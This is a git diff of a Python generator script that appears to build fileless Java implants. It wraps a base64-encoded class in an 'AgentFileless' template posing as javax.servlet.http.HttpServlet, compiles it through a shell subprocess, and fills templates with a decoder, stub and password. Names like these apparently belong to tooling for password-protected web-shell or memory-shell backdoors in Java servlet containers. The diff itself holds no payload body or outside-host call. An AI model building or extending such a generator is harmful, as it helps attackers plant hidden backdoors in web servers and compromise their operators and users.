@@ -35,13 +35,24 @@ def b64file(file_name):
     with open(file_name, "rb") as fb:
         b64_str = base64.b64encode(fb.read()).decode("utf-8")
     if "javax" in file_name.lower():
-        try:
-            pyperclip = import_module("pyperclip")
-            pyperclip.copy(b64_str)
-            print(f"---\nBase64 copied to clipboard.")
-        except ModuleNotFoundError:
-            print(f"---\n{b64_str}")
-        sys.exit("[WIP]")
+        src_dst = 'target/AgentFileless.java'
+        src = AGENTFILELESS.format(
+            className="javax.servlet.http.HttpServlet", classBody=b64_str
+        )
+        with open(src_dst, 'w') as f:
+            f.write(src)
+            print(f"            {src_dst}")
+
+        p = subprocess.Popen(
+            f"{java_compiler_path} -cp {java_lib_path} {src_dst}",shell=True,
+            stdout=subprocess.PIPE,stderr=subprocess.STDOUT
+        )
+        sleep(1)
+        class_dst = f'target/AgentFileless.class'
+        print(f"            {class_dst}")
+        
+        b64file(class_dst)
+        return
     if generate_script and "spring" not in file_name.lower():
         genscript(b64_str)
         
@@ -83,7 +94,7 @@ def generator(options):
         src = model.code.format(
             decoder=decoder.proc, stub=stub.proc, password=password
         )
-        src_dst = f'target/javax/servlet/http/HttpServlet.java'
+        src_dst = 'target/javax/servlet/http/HttpServlet.java'
     else:
         src = model.code.format(
             common=common.code, context=context.code, decoder=decoder.code,
@@ -106,7 +117,7 @@ def generator(options):
         )
         sleep(1)
         if model_name == "javax":
-            class_dst = f'target/javax/servlet/http/HttpServlet.class'
+            class_dst = 'target/javax/servlet/http/HttpServlet.class'
         else:
             class_dst = f'target/{options["container"]}{options["model"]}.class'
         print(f"            {class_dst}")
